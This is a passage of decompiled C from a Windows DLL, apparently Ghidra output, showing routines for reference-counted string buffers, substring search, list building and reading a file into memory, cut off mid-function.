int * __thiscall FUN_10010500(int *param_1,undefined4 param_2,undefined4 param_3)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  
  if (param_1 != (int *)0x0) {
    if (*param_1 == 0) {
      param_1[2] = 0;
      *(undefined2 *)(param_1 + 3) = 0;
      uVar4 = param_1[1];
      uVar1 = FUN_1004b420(param_2,param_3);
      if (uVar1 < uVar4) {
        param_1[2] = param_1[2] + uVar1;
        return param_1;
      }
      piVar2 = (int *)FUN_10010290(uVar1);
      if (piVar2 != (int *)0x0) {
        iVar3 = FUN_1004b420(param_2,param_3);
        piVar2[2] = piVar2[2] + iVar3;
        return piVar2;
      }
      return (int *)0x0;
    }
    LOCK();
    iVar3 = *param_1;
    *param_1 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(param_1);
    }
  }
  iVar3 = FUN_1004b420(param_2,param_3);
  if ((iVar3 != 0) && (iVar3 != -1)) {
    uVar4 = 0x10;
    if (0x10 < iVar3 + 1U) {
      uVar4 = iVar3 + 1U;
    }
    uVar4 = uVar4 + 0xf & 0xfffffff0;
    piVar2 = (int *)FUN_100581b4(uVar4 * 2 + 0xe);
    if (piVar2 != (int *)0x0) {
      piVar2[1] = uVar4;
      *piVar2 = 0;
      piVar2[2] = 0;
      *(undefined2 *)(piVar2 + 3) = 0;
      iVar3 = FUN_1004b420(param_2,param_3);
      piVar2[2] = piVar2[2] + iVar3;
      return piVar2;
    }
  }
  return (int *)0x0;
}



/* Function: FUN_10010600 */

undefined4 __thiscall FUN_10010600(int *param_1,uint param_2)

{
  uint uVar1;
  int iVar2;
  void *_Dst;
  errno_t eVar3;
  uint uVar4;
  
  uVar1 = param_1[2];
  if (uVar1 < param_2) {
    if (*param_1 == 0) {
      if (param_2 < (uint)param_1[3]) {
        param_2 = param_1[3];
      }
      iVar2 = FUN_1005907c(param_2,4);
      *param_1 = iVar2;
      if (iVar2 == 0) {
        return 0;
      }
    }
    else {
      uVar4 = param_1[3];
      if (param_1[3] == 0) {
        uVar4 = uVar1 >> 1;
        if (uVar1 >> 1 < param_2 - uVar1) {
          uVar4 = param_2 - uVar1;
        }
      }
      if (param_2 < uVar1 + uVar4) {
        param_2 = uVar1 + uVar4;
      }
      _Dst = (void *)FUN_1005907c(param_2,4);
      if (_Dst == (void *)0x0) {
        return 0;
      }
      eVar3 = _memmove_s(_Dst,param_1[1] << 2,(void *)*param_1,param_1[1] << 2);
      FUN_10007f40(eVar3);
      FUN_100579ee(*param_1);
      *param_1 = (int)_Dst;
    }
    param_1[2] = param_2;
  }
  return 1;
}



/* Function: FUN_100106a0 */

undefined4 __fastcall FUN_100106a0(int *param_1,undefined4 param_2,int *param_3,int param_4)

{
  short *psVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  uint uVar5;
  int *piVar6;
  int *piVar7;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int iVar8;
  short *psVar9;
  short sVar10;
  undefined4 uVar11;
  int local_70 [3];
  undefined4 local_64;
  undefined4 local_60;
  int local_5c;
  undefined4 local_48;
  int local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  int local_28;
  int *local_24;
  short *local_20;
  short *local_1c;
  uint local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074990;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_44 = 0;
  local_40 = 0;
  local_3c = 0;
  local_38 = 0;
  local_34 = 0;
  local_30 = 0;
  local_2c = 1;
  local_48 = 0;
  local_8 = 0;
  local_14 = param_1;
  FUN_1000e7e0(param_2,param_1);
  piVar4 = (int *)*param_1;
  iVar3 = FUN_10010370(0,1);
  *param_1 = iVar3;
  uVar11 = extraout_ECX;
  if ((iVar3 == 0) && (piVar4 != (int *)0x0)) {
    LOCK();
    iVar3 = *piVar4;
    *piVar4 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar4,uVar2);
      uVar11 = extraout_ECX_00;
    }
  }
  FUN_1000f000(uVar11);
  local_8 = CONCAT31(local_8._1_3_,1);
  iVar3 = *param_1;
  if ((iVar3 == 0) || (*(int *)(iVar3 + 8) == 0)) {
LAB_10010b4e:
    iVar3 = *param_1;
    if (iVar3 != 0) {
      psVar9 = (short *)(iVar3 + 0xc);
      if (psVar9 == (short *)0x0) {
LAB_10010b71:
        iVar8 = 0;
      }
      else {
        do {
          sVar10 = *psVar9;
          psVar9 = psVar9 + 1;
        } while (sVar10 != 0);
        iVar8 = (int)psVar9 - (iVar3 + 0xe) >> 1;
      }
LAB_10010b73:
      *(int *)(iVar3 + 8) = iVar8;
      *(undefined2 *)(iVar3 + 0xc + iVar8 * 2) = 0;
    }
  }
  else {
    if (iVar3 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = iVar3 + 0xc;
    }
    iVar3 = FUN_1000e8d0(iVar3,local_70,0);
    if (iVar3 == 0) goto LAB_10010b4e;
    if (local_70[0] != 0) {
      local_1c = (short *)0x0;
      local_20 = (short *)0x0;
      FUN_1000efb0(0,&local_1c,&local_20);
      psVar9 = local_1c;
      local_28 = (int)local_20 - (int)local_1c;
      local_18 = local_28 >> 1;
      if ((local_1c == (short *)0x0) || (*local_1c != 0)) {
        piVar4 = (int *)FUN_1000bd10();
      }
      else {
        piVar4 = (int *)FUN_1000ba60();
      }
      psVar1 = local_1c;
      if (piVar4 == (int *)0x0) {
        uVar2 = 0;
      }
      else {
        uVar2 = piVar4[2];
      }
      iVar3 = *param_3;
      local_24 = piVar4;
      if (((iVar3 == 0) || (*(uint *)(iVar3 + 8) <= uVar2)) && (param_4 != 1)) {
        if (piVar4 == (int *)0x0) {
          iVar8 = 0;
        }
        else {
          iVar8 = piVar4[2];
        }
        if (iVar3 == 0) {
          iVar3 = 0;
        }
        else {
          iVar3 = *(int *)(iVar3 + 8);
        }
        if (iVar8 == iVar3) {
          uVar2 = 0;
          if (local_18 != 0) {
            do {
              uVar5 = FUN_10007ad0();
              if (uVar5 <= uVar2) break;
              iVar3 = FUN_10006f50();
              psVar1[uVar2] = *(short *)(iVar3 + uVar2 * 2);
              uVar2 = uVar2 + 1;
            } while (uVar2 < local_18);
          }
          iVar3 = *local_14;
          piVar4 = local_24;
          if (iVar3 != 0) {
            psVar9 = (short *)(iVar3 + 0xc);
            if (psVar9 == (short *)0x0) goto LAB_100108a1;
            do {
              sVar10 = *psVar9;
              psVar9 = psVar9 + 1;
            } while (sVar10 != 0);
            iVar8 = (int)psVar9 - (iVar3 + 0xe) >> 1;
            goto LAB_100108a3;
          }
        }
        else if (param_4 == 0) {
          uVar2 = 0;
          uVar5 = local_28 + 1U >> 1;
          if (local_20 < psVar9) {
            uVar5 = 0;
          }
          if (uVar5 != 0) {
            do {
              uVar2 = uVar2 + 1;
              *psVar9 = 0x20;
              psVar9 = psVar9 + 1;
            } while (uVar2 < uVar5);
          }
          uVar2 = 0;
          if (local_18 != 0) {
            do {
              uVar5 = FUN_10007ad0();
              if (uVar5 <= uVar2) break;
              iVar3 = FUN_10006f50();
              psVar1[uVar2] = *(short *)(iVar3 + uVar2 * 2);
              uVar2 = uVar2 + 1;
            } while (uVar2 < local_18);
          }
          iVar3 = *local_14;
          piVar4 = local_24;
          if (iVar3 != 0) {
            psVar9 = (short *)(iVar3 + 0xc);
            if (psVar9 == (short *)0x0) {
LAB_100108a1:
              iVar8 = 0;
            }
            else {
              do {
                sVar10 = *psVar9;
                psVar9 = psVar9 + 1;
              } while (sVar10 != 0);
              iVar8 = (int)psVar9 - (iVar3 + 0xe) >> 1;
            }
LAB_100108a3:
            *(int *)(iVar3 + 8) = iVar8;
            *(undefined2 *)(iVar3 + 0xc + iVar8 * 2) = 0;
            piVar4 = local_24;
          }
        }
        else {
          uVar2 = 0;
          if (local_18 != 0) {
            do {
              uVar5 = FUN_10007ad0();
              if (uVar5 <= uVar2) break;
              iVar3 = FUN_10006f50();
              psVar1[uVar2] = *(short *)(iVar3 + uVar2 * 2);
              uVar2 = uVar2 + 1;
            } while (uVar2 < local_18);
          }
          iVar3 = *local_14;
          if (iVar3 == 0) {
            iVar8 = 0;
            iVar3 = 0;
          }
          else {
            iVar8 = iVar3 + 0xc;
            iVar3 = *(int *)(iVar3 + 8);
          }
          if (*(short *)(iVar8 + iVar3 * 2) == 0) {
            if (*param_3 == 0) {
              iVar3 = 0;
            }
            else {
              iVar3 = *(int *)(*param_3 + 8);
            }
            psVar9 = local_1c + iVar3;
            sVar10 = *local_20;
            if (sVar10 != 0) {
              iVar3 = (int)local_20 - (int)psVar9;
              do {
                *psVar9 = sVar10;
                psVar9 = psVar9 + 1;
                sVar10 = *(short *)(iVar3 + (int)psVar9);
              } while (sVar10 != 0);
            }
            *psVar9 = 0;
          }
          iVar3 = *local_14;
          piVar4 = local_24;
          if (iVar3 != 0) {
            psVar9 = (short *)(iVar3 + 0xc);
            if (psVar9 == (short *)0x0) goto LAB_100108a1;
            do {
              sVar10 = *psVar9;
              psVar9 = psVar9 + 1;
            } while (sVar10 != 0);
            iVar8 = (int)psVar9 - (iVar3 + 0xe) >> 1;
            goto LAB_100108a3;
          }
        }
      }
      else {
        if (*local_14 == 0) {
          psVar9 = (short *)0x0;
        }
        else {
          psVar9 = (short *)(*local_14 + 0xc);
        }
        if ((psVar9 == (short *)0x0) || (*psVar9 != 0)) {
          piVar6 = (int *)FUN_1000bd10();
        }
        else {
          piVar6 = (int *)FUN_1000ba60();
        }
        if ((local_20 == (short *)0x0) || (*local_20 != 0)) {
          piVar7 = (int *)FUN_1000bd10();
        }
        else {
          piVar7 = (int *)FUN_1000ba60();
        }
        iVar3 = FUN_10010440(piVar6);
        *local_14 = iVar3;
        iVar3 = *param_3;
        if ((iVar3 != 0) && (*(int *)(iVar3 + 8) != 0)) {
          iVar3 = FUN_1000bfa0(iVar3 + 0xc,*(undefined4 *)(iVar3 + 8));
          *local_14 = iVar3;
        }
        if ((piVar7 != (int *)0x0) && (piVar7[2] != 0)) {
          iVar3 = FUN_1000bfa0(piVar7 + 3,piVar7[2]);
          *local_14 = iVar3;
        }
        iVar3 = *local_14;
        if (iVar3 != 0) {
          psVar9 = (short *)(iVar3 + 0xc);
          if (psVar9 == (short *)0x0) {
            iVar8 = 0;
          }
          else {
            local_28 = iVar3 + 0xe;
            do {
              sVar10 = *psVar9;
              psVar9 = psVar9 + 1;
            } while (sVar10 != 0);
            iVar8 = (int)psVar9 - local_28 >> 1;
          }
          *(int *)(iVar3 + 8) = iVar8;
          *(undefined2 *)(iVar3 + 0xc + iVar8 * 2) = 0;
        }
        if (piVar7 != (int *)0x0) {
          LOCK();
          iVar3 = *piVar7;
          *piVar7 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(piVar7);
          }
        }
        if (piVar6 != (int *)0x0) {
          LOCK();
          iVar3 = *piVar6;
          *piVar6 = iVar3 + -1;
          UNLOCK();
          if (iVar3 + -1 < 0) {
            FUN_100579ee(piVar6);
          }
        }
      }
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar3 = *piVar4;
        *piVar4 = *piVar4 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar4);
        }
      }
      uVar11 = 1;
      goto LAB_10010b7f;
    }
    iVar3 = *param_1;
    if (iVar3 != 0) {
      psVar9 = (short *)(iVar3 + 0xc);
      if (psVar9 == (short *)0x0) goto LAB_10010b71;
      do {
        sVar10 = *psVar9;
        psVar9 = psVar9 + 1;
      } while (sVar10 != 0);
      iVar8 = (int)psVar9 - (iVar3 + 0xe) >> 1;
      goto LAB_10010b73;
    }
  }
  uVar11 = 0;
LAB_10010b7f:
  if (local_5c != 0) {
    FUN_100579ee(local_5c);
  }
  thunk_FUN_100579ee(local_60);
  local_60 = 0;
  thunk_FUN_100579ee(local_64);
  local_64 = 0;
  if (local_44 != 0) {
    FUN_100579ee(local_44);
  }
  ExceptionList = local_10;
  return uVar11;
}



/* Function: FUN_10010be0 */

int __thiscall FUN_10010be0(int *param_1,uint param_2)

{
  code *pcVar1;
  int iVar2;
  
  if (param_2 < (uint)param_1[1]) {
    return *param_1 + param_2 * 8;
  }
  FUN_10007f20(0x80070057);
  pcVar1 = (code *)swi(3);
  iVar2 = (*pcVar1)();
  return iVar2;
}



/* Function: FUN_10010c00 */

int __fastcall FUN_10010c00(int *param_1,short *param_2)

{
  int iVar1;
  bool bVar2;
  int *piVar3;
  int *piVar4;
  int iVar5;
  int iVar6;
  int *piVar7;
  int local_8;
  
  iVar6 = 0;
  local_8 = 0;
  bVar2 = false;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    piVar3 = (int *)FUN_1000bd10();
  }
  else {
    piVar3 = (int *)FUN_1000ba60();
  }
  iVar1 = *param_1;
  while( true ) {
    if (piVar3 == (int *)0x0) {
      iVar5 = 0;
      piVar7 = (int *)0x0;
    }
    else {
      iVar5 = piVar3[2];
      piVar7 = piVar3 + 3;
    }
    if ((iVar1 == 0) || (*(uint *)(iVar1 + 8) <= (uint)(iVar6 + local_8))) break;
    if (iVar5 == -1) {
      if (piVar7 == (int *)0x0) {
        iVar5 = 0;
      }
      else {
        piVar4 = piVar7;
        do {
          iVar5 = *piVar4;
          piVar4 = (int *)((int)piVar4 + 2);
        } while ((short)iVar5 != 0);
        iVar5 = (int)piVar4 - ((int)piVar7 + 2) >> 1;
      }
    }
    iVar5 = FUN_1004b5c0(piVar7,iVar5);
    if ((iVar5 == -1) || (iVar5 = iVar5 + iVar6 + local_8, iVar5 == -1)) break;
    iVar6 = 1;
    bVar2 = true;
    local_8 = iVar5;
  }
  if (!bVar2) {
    local_8 = -1;
  }
  if (piVar3 != (int *)0x0) {
    LOCK();
    iVar6 = *piVar3;
    *piVar3 = *piVar3 + -1;
    UNLOCK();
    if (iVar6 + -1 < 0) {
      FUN_100579ee(piVar3);
      return local_8;
    }
  }
  return local_8;
}



/* Function: FUN_10010d00 */

int __fastcall FUN_10010d00(int *param_1,char *param_2)

{
  int iVar1;
  bool bVar2;
  int *piVar3;
  int *piVar4;
  int iVar5;
  int iVar6;
  int *piVar7;
  int local_8;
  
  iVar6 = 0;
  local_8 = 0;
  bVar2 = false;
  if ((param_2 == (char *)0x0) || (*param_2 != '\0')) {
    piVar3 = (int *)FUN_100075b0();
  }
  else {
    piVar3 = (int *)FUN_10007ae0();
  }
  iVar1 = *param_1;
  while( true ) {
    if (piVar3 == (int *)0x0) {
      iVar5 = 0;
      piVar7 = (int *)0x0;
    }
    else {
      iVar5 = piVar3[2];
      piVar7 = piVar3 + 3;
    }
    if ((iVar1 == 0) || (*(uint *)(iVar1 + 8) <= (uint)(iVar6 + local_8))) break;
    if (iVar5 == -1) {
      if (piVar7 == (int *)0x0) {
        iVar5 = 0;
      }
      else {
        piVar4 = piVar7;
        do {
          iVar5 = *piVar4;
          piVar4 = (int *)((int)piVar4 + 1);
        } while ((char)iVar5 != '\0');
        iVar5 = (int)piVar4 - ((int)piVar7 + 1);
      }
    }
    iVar5 = FUN_1004b540(piVar7,iVar5);
    if ((iVar5 == -1) || (iVar5 = iVar5 + iVar6 + local_8, iVar5 == -1)) break;
    iVar6 = 1;
    bVar2 = true;
    local_8 = iVar5;
  }
  if (!bVar2) {
    local_8 = -1;
  }
  if (piVar3 != (int *)0x0) {
    LOCK();
    iVar6 = *piVar3;
    *piVar3 = *piVar3 + -1;
    UNLOCK();
    if (iVar6 + -1 < 0) {
      FUN_100579ee(piVar3);
      return local_8;
    }
  }
  return local_8;
}



/* Function: FUN_10010df0 */

undefined4 __fastcall FUN_10010df0(undefined4 param_1,undefined4 *param_2,int *param_3,int *param_4)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  int *piVar5;
  int *local_10;
  undefined4 *local_c;
  int local_8;
  
  if (param_4 == (int *)0x0) {
    iVar2 = 0;
    piVar5 = (int *)0x0;
  }
  else {
    iVar2 = param_4[2];
    piVar5 = param_4 + 3;
  }
  iVar2 = FUN_1000ad70(piVar5,iVar2,0);
  if (param_4 == (int *)0x0) {
    local_8 = 0;
  }
  else {
    local_8 = param_4[2];
  }
  if (iVar2 == -1) {
    uVar4 = 0;
  }
  else {
    puVar3 = (undefined4 *)FUN_1000e640(&local_10,0,iVar2);
    uVar4 = FUN_10010440(*puVar3);
    *local_c = uVar4;
    if (local_10 != (int *)0x0) {
      LOCK();
      iVar1 = *local_10;
      *local_10 = iVar1 + -1;
      UNLOCK();
      if (iVar1 + -1 < 0) {
        FUN_100579ee(local_10);
      }
    }
    puVar3 = (undefined4 *)FUN_1000e640(&local_10,local_8 + iVar2,0xffffffff);
    uVar4 = FUN_10010440(*puVar3);
    *param_2 = uVar4;
    if (local_10 != (int *)0x0) {
      LOCK();
      iVar2 = *local_10;
      *local_10 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(local_10);
      }
    }
    uVar4 = 1;
  }
  if (param_3 != (int *)0x0) {
    LOCK();
    iVar2 = *param_3;
    *param_3 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(param_3);
    }
  }
  if (param_4 != (int *)0x0) {
    LOCK();
    iVar2 = *param_4;
    *param_4 = *param_4 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(param_4);
    }
  }
  return uVar4;
}



/* Function: FUN_10010ef0 */

undefined4 * __thiscall FUN_10010ef0(undefined4 *param_1,undefined4 param_2)

{
  uint uVar1;
  int iVar2;
  undefined4 uVar3;
  uint uVar4;
  int iVar5;
  undefined4 in_stack_fffffeec;
  undefined4 in_stack_fffffef0;
  undefined4 in_stack_fffffef4;
  uint uStack_108;
  int local_f8 [14];
  int aiStack_c0 [10];
  int local_98;
  undefined **local_88 [19];
  int local_3c;
  uint local_38;
  int local_34;
  uint local_30;
  int local_2c;
  undefined4 *local_1c;
  undefined1 *local_14;
  void *local_10;
  undefined1 *puStack_c;
  int local_8;
  
  puStack_c = &LAB_100749c3;
  local_10 = ExceptionList;
  uStack_108 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_14 = (undefined1 *)&uStack_108;
  ExceptionList = &local_10;
  *param_1 = 0;
  local_8 = 0;
  local_1c = param_1;
  FUN_10011660(param_2,in_stack_fffffeec,in_stack_fffffef0,in_stack_fffffef4);
  local_8._0_1_ = 1;
  if (local_98 != 0) {
    (**(code **)(local_f8[4] + 0x28))(&local_38,0,0,2,3);
    iVar5 = local_38 + local_30;
    local_3c = local_34 + local_2c + (uint)CARRY4(local_38,local_30);
    (**(code **)(local_f8[4] + 0x28))(&local_38,0,0,0,3);
    local_8._0_1_ = 2;
    iVar2 = FUN_100582f1(iVar5 + 1,&DAT_10098020);
    if (iVar2 != 0) {
      (**(code **)(local_f8[4] + 0x20))(iVar2,iVar5,0);
      *(undefined1 *)(iVar5 + iVar2) = 0;
      uVar3 = FUN_10007b60(iVar2,iVar5);
      *param_1 = uVar3;
      thunk_FUN_100579ee(iVar2);
      local_8 = 1;
      iVar2 = FUN_10012a60();
      if (iVar2 == 0) {
        iVar2 = *(int *)(local_f8[0] + 4);
        uVar1 = *(uint *)((int)local_f8 + iVar2 + 0xc);
        uVar4 = uVar1 | 2;
        if (*(int *)((int)aiStack_c0 + iVar2) == 0) {
          uVar4 = uVar1 | 6;
        }
        *(uint *)((int)local_f8 + iVar2 + 0xc) = uVar4 & 0x17;
        if ((*(uint *)((int)local_f8 + iVar2 + 0x10) & uVar4 & 0x17) != 0) {
          FUN_10008c40();
        }
      }
      std::basic_ifstream<char,struct_std::char_traits<char>_>::_vbase_destructor_
                ((basic_ifstream<char,struct_std::char_traits<char>_> *)local_f8);
      ExceptionList = local_10;
      return param_1;
    }
  }
  local_8 = (uint)local_8._1_3_ << 8;
  *(undefined ***)((int)local_f8 + *(int *)(local_f8[0] + 4)) = &PTR_LAB_1008351c;
  *(int *)((int)local_f8 + *(int *)(local_f8[0] + 4) + -4) = *(int *)(local_f8[0] + 4) + -0x70;
  FUN_100117e0();
  *(undefined ***)((int)local_f8 + *(int *)(local_f8[0] + 4)) = &PTR_LAB_100835a4;
  *(int *)((int)local_f8 + *(int *)(local_f8[0] + 4) + -4) = *(int *)(local_f8[0] + 4) + -0x18;
  local_88[0] = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor((ios_base *)local_88);
  ExceptionList = local_10;
  return param_1;
}



/* Function: Catch_All@10011037 */

undefined * Catch_All_10011037(void)

{
  return &DAT_1001103d;
}



/* Function: FUN_100110e0 */

undefined4 __fastcall FUN_100110e0(int *param_1,undefined4 param_2,undefined4 *param_3)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  undefined4 uVar4;
  undefined4 extraout_ECX;
  int local_64 [3];
  undefined4 local_58;
  undefined4 local_54;
  int local_50;
  undefined4 local_3c;
  int local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  int *local_1c;
  int local_18 [2];
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074a00;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  if ((*param_1 == 0) || (*param_1 == -0xc)) {
    return 0;
  }
  local_38 = 0;
  local_34 = 0;
  local_30 = 0;
  local_2c = 0;
  local_28 = 0;
  local_24 = 0;
  local_20 = 1;
  local_3c = 0;
  local_8 = 0;
  ExceptionList = &local_10;
  FUN_10012020(param_2,param_1);
  FUN_1000f000(extraout_ECX);
  local_8 = CONCAT31(local_8._1_3_,1);
  iVar3 = *param_1;
  if ((iVar3 != 0) && (*(int *)(iVar3 + 8) != 0)) {
    if (iVar3 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = iVar3 + 0xc;
    }
    iVar3 = FUN_10012110(iVar3,local_64,0);
    if ((iVar3 != 0) && (local_64[0] != 0)) {
      local_1c = (int *)0x0;
      local_18[0] = 0;
      FUN_1000efb0(0,&local_1c,local_18);
      FUN_10007a90(local_1c,local_18[0] - (int)local_1c);
      piVar1 = local_1c;
      uVar4 = FUN_10007010(local_1c);
      *param_3 = uVar4;
      if (piVar1 != (int *)0x0) {
        LOCK();
        iVar3 = *piVar1;
        *piVar1 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar1);
        }
      }
      uVar4 = 1;
      goto LAB_1001120b;
    }
  }
  uVar4 = 0;
LAB_1001120b:
  if (local_50 != 0) {
    FUN_100579ee(local_50,uVar2);
  }
  thunk_FUN_100579ee(local_54);
  local_54 = 0;
  thunk_FUN_100579ee(local_58);
  local_58 = 0;
  if (local_38 != 0) {
    FUN_100579ee(local_38);
  }
  ExceptionList = local_10;
  return uVar4;
}



/* Function: FUN_10011280 */

undefined4 __thiscall FUN_10011280(int *param_1,undefined4 *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  int *piVar4;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074a28;
  local_10 = ExceptionList;
  if ((*param_1 == 0) || (*param_1 == -0xc)) {
    return 0;
  }
  local_14 = (int *)0x0;
  local_8 = 0;
  ExceptionList = &local_10;
  iVar2 = FUN_100110e0(&local_14,DAT_100956e0 ^ (uint)&stack0xfffffffc);
  piVar1 = local_14;
  if (iVar2 != 0) {
    if ((local_14 == (int *)0x0) || (piVar4 = local_14 + 3, piVar4 == (int *)0x0)) {
      piVar4 = (int *)&DAT_10083790;
    }
    uVar3 = FUN_1004b720(piVar4);
    if (param_2 != (undefined4 *)0x0) {
      *param_2 = uVar3;
      uVar3 = 1;
      goto LAB_100112fc;
    }
  }
  uVar3 = 0;
LAB_100112fc:
  if (piVar1 != (int *)0x0) {
    LOCK();
    iVar2 = *piVar1;
    *piVar1 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(piVar1);
    }
  }
  ExceptionList = local_10;
  return uVar3;
}



/* Function: FUN_10011340 */

bool __fastcall FUN_10011340(int *param_1,undefined4 param_2,int *param_3)

{
  char cVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  undefined4 extraout_ECX;
  char *pcVar6;
  uint uVar7;
  uint local_68 [3];
  undefined4 local_5c;
  int local_58;
  int local_54;
  undefined4 local_40;
  int local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  char *local_20;
  int *local_1c;
  char *local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074a68;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  if ((*param_1 == 0) || (*param_1 == -0xc)) {
    return false;
  }
  local_3c = 0;
  local_38 = 0;
  local_34 = 0;
  local_30 = 0;
  local_2c = 0;
  local_28 = 0;
  local_24 = 1;
  local_40 = 0;
  local_8 = 0;
  ExceptionList = &local_10;
  FUN_10012020(param_2,param_1);
  FUN_1000f000(extraout_ECX);
  local_8._0_1_ = 1;
  if (*param_1 == 0) {
    local_20 = (char *)0x0;
  }
  else {
    local_20 = (char *)(*param_1 + 0xc);
  }
  pcVar6 = local_20;
  do {
    cVar1 = *pcVar6;
    pcVar6 = pcVar6 + 1;
  } while (cVar1 != '\0');
  local_18 = local_20;
  if (pcVar6 != local_20 + 1 && -1 < (int)pcVar6 - (int)(local_20 + 1)) {
    while (pcVar6 = local_18, local_20 = local_18, iVar3 = FUN_10012110(local_18,local_68,&local_20)
          , iVar3 != 0) {
      uVar7 = 0;
      if (local_68[0] != 0) {
        if (local_68[0] == 0) {
LAB_1001154c:
          FUN_10007f20(0x80004005);
          ExceptionList = local_10;
          return false;
        }
        do {
          pcVar6 = *(char **)(local_58 + uVar7 * 8);
          if ((pcVar6 == (char *)0x0) || (*pcVar6 != '\0')) {
            piVar4 = (int *)FUN_100075b0();
          }
          else {
            piVar4 = (int *)FUN_10007ae0();
          }
          local_8._0_1_ = 2;
          iVar3 = *param_3;
          local_1c = piVar4;
          iVar5 = FUN_10011570(iVar3,*(undefined4 *)(iVar3 + 4),&local_1c);
          if (param_3[1] == 0x15555554) {
            FUN_10056a6a("list<T> too long");
            goto LAB_1001154c;
          }
          param_3[1] = param_3[1] + 1;
          *(int *)(iVar3 + 4) = iVar5;
          local_8._0_1_ = 1;
          **(int **)(iVar5 + 4) = iVar5;
          if (piVar4 != (int *)0x0) {
            LOCK();
            iVar3 = *piVar4;
            *piVar4 = iVar3 + -1;
            UNLOCK();
            if (iVar3 + -1 < 0) {
              FUN_100579ee(piVar4);
            }
          }
          uVar7 = uVar7 + 1;
          pcVar6 = local_18;
        } while (uVar7 < local_68[0]);
      }
      if ((pcVar6 == (char *)0x0) || (*pcVar6 == '\0')) break;
      local_18 = local_20;
      pcVar6 = local_20;
      do {
        cVar1 = *pcVar6;
        pcVar6 = pcVar6 + 1;
      } while (cVar1 != '\0');
      if (pcVar6 == local_20 + 1 || (int)pcVar6 - (int)(local_20 + 1) < 0) break;
    }
  }
  iVar3 = param_3[1];
  if (local_54 != 0) {
    FUN_100579ee(local_54,uVar2);
  }
  thunk_FUN_100579ee(local_58);
  local_58 = 0;
  thunk_FUN_100579ee(local_5c);
  local_5c = 0;
  if (local_3c != 0) {
    FUN_100579ee(local_3c);
  }
  ExceptionList = local_10;
  return iVar3 != 0;
}



/* Function: FUN_10011570 */

int FUN_10011570(undefined4 param_1,undefined4 param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = FUN_1000fa00(param_1,param_2);
  if ((undefined4 *)(iVar2 + 8) != (undefined4 *)0x0) {
    piVar1 = (int *)*param_3;
    *(undefined4 *)(iVar2 + 8) = piVar1;
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + 1;
      UNLOCK();
    }
  }
  return iVar2;
}



/* Function: `vbase_destructor' */

/* Library Function - Single Match
    public: void __thiscall std::basic_ifstream<char,struct std::char_traits<char> >::`vbase
   destructor'(void)
   
   Library: Visual Studio 2019 Release */

void __thiscall
std::basic_ifstream<char,struct_std::char_traits<char>_>::_vbase_destructor_
          (basic_ifstream<char,struct_std::char_traits<char>_> *this)

{
  ios_base *piVar1;
  
  piVar1 = (ios_base *)(this + 0x70);
  *(undefined ***)(piVar1 + *(int *)(*(int *)this + 4) + -0x70) = &PTR_LAB_1008351c;
  *(int *)(piVar1 + *(int *)(*(int *)this + 4) + -0x74) = *(int *)(*(int *)this + 4) + -0x70;
  FUN_100117e0();
  *(undefined ***)(piVar1 + *(int *)(*(int *)this + 4) + -0x70) = &PTR_LAB_100835a4;
  *(int *)(piVar1 + *(int *)(*(int *)this + 4) + -0x74) = *(int *)(*(int *)this + 4) + -0x18;
  *(undefined ***)piVar1 = ios_base::vftable;
  ios_base::_Ios_base_dtor(piVar1);
  return;
}



/* Function: FUN_10011610 */

int __thiscall FUN_10011610(int *param_1,undefined4 param_2)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)*param_1;
  iVar2 = FUN_10010370(param_2,1);
  *param_1 = iVar2;
  if (iVar2 == 0) {
    if (piVar1 != (int *)0x0) {
      LOCK();
      iVar2 = *piVar1;
      *piVar1 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(piVar1);
